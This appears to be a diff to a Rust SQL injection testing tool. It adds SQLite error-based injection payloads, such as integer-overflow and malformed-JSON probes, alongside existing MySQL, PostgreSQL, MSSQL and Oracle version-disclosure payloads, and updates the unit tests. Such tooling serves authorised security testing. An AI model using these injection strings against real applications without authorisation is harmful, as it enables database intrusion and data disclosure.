@@ -2,7 +2,7 @@
 
 use crate::dbms::{
     mssql::payloads as mssql_p, mysql::payloads as mysql_p, oracle::payloads as oracle_p,
-    postgres::payloads as pg_p,
+    postgres::payloads as pg_p, sqlite::payloads as sqlite_p,
 };
 
 #[derive(Debug, Clone)]
@@ -13,7 +13,7 @@ pub struct ErrorPayload {
 }
 
 /// Per-DBMS error payloads delegate to the canonical per-DBMS sets in
-/// `crate::dbms::{mysql,postgres,mssql,oracle}::payloads` (single source of
+/// `crate::dbms::{mysql,postgres,mssql,oracle,sqlite}::payloads` (single source of
 /// truth, same pattern as `time_payloads_for`). Legacy payloads stay first
 /// so `--level 1` budgets are byte-identical to the pre-enrichment behaviour.
 ///
@@ -26,8 +26,10 @@ pub struct ErrorPayload {
 ///   `FOR XML PATH('')`
 /// - Oracle: `CTXSYS.DRITHSX.SN` (legacy), `UTL_INADDR` (legacy),
 ///   `TO_NUMBER(banner)` (ORA-01722), `XMLTYPE(banner)`, `DBMS_XDB`
-/// - Generic/`None`: the four legacies first (mysql/pg/mssql historically,
-///   oracle appended), then one representative variant per DBMS so L1 stays
+/// - SQLite: `abs(-9223372036854775808)` integer-overflow (legacy),
+///   `json_extract('__bad__','$')` malformed-JSON (legacy)
+/// - Generic/`None`: the legacies first (mysql/pg/mssql historically,
+///   oracle + sqlite appended), then one representative variant per DBMS so L1 stays
 ///   Compat (`take(2)` = historical mysql + pg) while L2/L3 sweep new channels.
 #[must_use]
 pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
@@ -60,6 +62,13 @@ pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
                 dbms: "oracle".to_owned(),
             })
             .collect(),
+        Some("sqlite") => sqlite_p::sqlite_error_payloads()
+            .into_iter()
+            .map(|p| ErrorPayload {
+                payload: p,
+                dbms: "sqlite".to_owned(),
+            })
+            .collect(),
         _ => vec![
             // Legacies first — first three byte-identical to historical generic.
             ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -", "mysql"),
@@ -69,6 +78,8 @@ pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
                 "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                 "oracle",
             ),
+            ("' AND abs(-9223372036854775808) --", "sqlite"),
+            ("' AND json_extract('__bad__','$') --", "sqlite"),
             // One representative variant per DBMS (L2/L3 sweep).
             (
                 "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1) -- -",
@@ -83,6 +94,10 @@ pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
                 "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                 "oracle",
             ),
+            (
+                "' AND (CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END) --",
+                "sqlite",
+            ),
         ]
         .into_iter()
         .map(|(p, d)| ErrorPayload {
@@ -95,13 +110,13 @@ pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
 
 /// Every DBMS-specific error payload (legacies + variants) for blind sweeps
 /// when the backend is unknown. Ordering is stable: all legacies first
-/// (mysql, postgres, mssql, oracle in per-DBMS order), then variants — so
+/// (mysql, postgres, mssql, oracle, sqlite in per-DBMS order), then variants — so
 /// `--level` budgets degrade gracefully to legacy coverage.
 #[must_use]
 pub fn all_error_payloads() -> Vec<ErrorPayload> {
     let mut legacies = Vec::new();
     let mut variants = Vec::new();
-    for dbms in ["mysql", "postgres", "mssql", "oracle"] {
+    for dbms in ["mysql", "postgres", "mssql", "oracle", "sqlite"] {
         let mut v = error_payloads_for(Some(dbms));
         if !v.is_empty() {
             // First two per DBMS are the historical legacies.
@@ -186,14 +201,26 @@ mod tests {
             oracle.iter().any(|p| p.payload.contains("DBMS_XDB")),
             "{oracle:?}"
         );
+        let sqlite = error_payloads_for(Some("sqlite"));
+        assert_eq!(sqlite.len(), sqlite_p::sqlite_error_payloads().len());
+        assert!(
+            sqlite
+                .iter()
+                .any(|p| p.payload.contains("abs(-9223372036854775808)")),
+            "{sqlite:?}"
+        );
+        assert!(
+            sqlite.iter().any(|p| p.payload.contains("json_extract")),
+            "{sqlite:?}"
+        );
     }
 
     #[test]
     fn generic_sweeps_all_dbms_at_high_level() {
         let g = error_payloads_for(None);
-        // 4 legacies + 4 variants.
-        assert_eq!(g.len(), 8);
-        for dbms in ["mysql", "postgres", "mssql", "oracle"] {
+        // 6 legacies (4 historical + 2 sqlite) + 5 variants (4 + 1 sqlite).
+        assert_eq!(g.len(), 11);
+        for dbms in ["mysql", "postgres", "mssql", "oracle", "sqlite"] {
             assert!(g.iter().any(|p| p.dbms == dbms), "missing {dbms}");
         }
     }
@@ -201,11 +228,12 @@ mod tests {
     #[test]
     fn all_payloads_start_with_legacies() {
         let all = all_error_payloads();
-        // 2 legacies × 4 DBMS = 8 legacies first.
-        assert_eq!(all.len(), 5 + 3 + 4 + 5);
+        // 2 legacies × 5 DBMS = 10 legacies first.
+        assert_eq!(all.len(), 5 + 3 + 4 + 5 + 4);
         assert!(all[0].payload.contains("EXTRACTVALUE"));
         assert!(all[2].payload.contains("CAST((SELECT version())"));
         assert!(all[4].payload.contains("CONVERT(int,@@version)"));
+        assert!(all[8].payload.contains("abs(-9223372036854775808)"));
     }
 
     #[test]
@@ -225,6 +253,10 @@ mod tests {
         assert_eq!(
             error_payloads_for(Some("oracle")).len(),
             oracle_p::oracle_error_payloads().len()
+        );
+        assert_eq!(
+            error_payloads_for(Some("sqlite")).len(),
+            sqlite_p::sqlite_error_payloads().len()
         );
     }
 }
